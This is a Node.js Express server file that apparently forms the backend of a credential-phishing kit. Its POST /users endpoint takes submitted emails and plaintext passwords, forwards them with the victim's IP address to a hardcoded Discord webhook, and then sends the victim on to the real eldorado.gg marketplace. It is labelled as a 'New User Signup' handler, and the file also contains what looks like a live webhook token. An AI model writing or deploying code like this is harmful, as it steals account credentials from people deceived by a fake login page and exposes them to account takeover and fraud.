// index.js
require('dotenv').config();
const express = require('express');
const path = require('path');

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1496977651552751638/xRSADyrWvCGzw1QxJBDF5OVjkfFEuTYXeQA4Hyws7ksHXkRNCnx3hLD1JDQz-dkwzae-';
if (!DISCORD_WEBHOOK_URL) {
  console.warn('WARN: DISCORD_WEBHOOK_URL not set — Discord notifications disabled.');
}

let fetchLib = null;
// Prefer global fetch (Node 18+). Fallback to node-fetch if available (v2).
if (typeof fetch === 'function') {
  fetchLib = fetch.bind(globalThis);
} else {
  try {
    // node-fetch v2 supports require(); if it's not installed this will throw.
    // If you're using node-fetch v3 (ESM-only), install node-fetch@2 or rely on Node 18+ global fetch.
    // npm install node-fetch@2
    // eslint-disable-next-line global-require
    fetchLib = require('node-fetch');
  } catch (err) {
    console.warn('No fetch implementation available. Discord notifications will be disabled.', err.message || err);
    fetchLib = null;
  }
}

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from public directory (if it exists)
app.use(express.static(path.join(__dirname, 'public')));

/**
 * Validates email format
 * @param {string} email - The email to validate
 * @returns {boolean} - True if valid email format
 */
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

/**
 * Extracts client IP address from request
 * @param {object} req - Express request object
 * @returns {string} - Client IP address or 'unknown'
 */
function getClientIP(req) {
  return (
    req.ip ||
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

/**
 * Sends a notification to Discord webhook
 * @param {object} data - Object containing email, password, and ip
 * @returns {Promise<boolean>} - True if successful, false otherwise
 */
async function sendDiscordNotification({ email, password, ip }) {
  if (!DISCORD_WEBHOOK_URL || !fetchLib) return false;

  const fields = [
    {
      name: 'Email',
      value: email,
      inline: true
    },
    {
      name: 'IP Address',
      value: ip,
      inline: true
    },
    {
      name: 'Timestamp',
      value: new Date().toISOString(),
      inline: false
    }
  ];

  // Add password field if provided
  if (password) {
    fields.push({
      name: 'Password',
      value: password,
      inline: false
    });
  }

  const payload = {
    username: 'Site Signup',
    embeds: [
      {
        title: 'New User Signup',
        color: 3066993,
        fields: fields
      }
    ]
  };

  try {
    const resp = await fetchLib(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      timeout: 5000
    });

    if (!resp.ok) {
      const text = await resp.text().catch(() => '');
      console.error(`Discord webhook error [${resp.status}]:`, text);
      return false;
    }

    console.log(`Discord notification sent for: ${email}`);
    return true;
  } catch (err) {
    console.error('Failed to send Discord webhook:', err.message);
    return false;
  }
}

/**
 * POST endpoint - accepts user signup data
 * Expected body: { email, password, [otherFields...] }
 */
app.post('/users', async (req, res) => {
  try {
    const { email, password } = req.body;
    const ip = getClientIP(req);

    // Validate email
    if (!email || typeof email !== 'string') {
      return res.status(400).json({ error: 'Missing or invalid email field' });
    }

    if (!isValidEmail(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    // Validate password
    if (!password || typeof password !== 'string') {
      return res.status(400).json({ error: 'Missing or invalid password field' });
    }

    console.log(`Received signup: ${email} from ${ip}`);

    // Send Discord notification (non-blocking)
    sendDiscordNotification({ email, password, ip }).catch((err) => {
      console.error('Discord notification failed:', err);
    });

    // Return success response
    return res.status(200).json({
      success: true,
      message: 'Signup received successfully',
      redirectUrl: 'https://www.eldorado.gg/'
    });
  } catch (err) {
    console.error('Error in /users handler:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/**
 * Health check endpoint
 */
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'Server is running' });
});

/**
 * Catch-all 404 handler
 */
app.use((req, res) => {
  res.status(404).json({ error: 'Not Found' });
});

/**
 * Global error handler
 */
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});